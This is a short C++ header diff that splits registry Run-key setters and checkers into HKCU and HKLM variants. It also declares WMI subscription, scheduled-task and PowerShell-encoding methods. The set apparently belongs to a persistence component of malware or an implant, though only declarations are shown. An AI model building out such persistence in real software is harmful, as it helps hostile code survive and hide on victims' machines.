@@ -12,8 +12,10 @@ private:
     void setup_wmi_subscription();
 #ifdef _WIN32
     std::string executable_path() const;
-    void set_run_key(const std::string& cmd);
-    bool check_run_key() const;
+    void set_run_key_hkcu(const std::string& cmd);
+    void set_run_key_hklm(const std::string& cmd);
+    bool check_run_key_hkcu() const;
+    bool check_run_key_hklm() const;
     void set_task(const std::string& cmd);
     bool check_task() const;
     std::string encode_ps(const std::string& path) const;
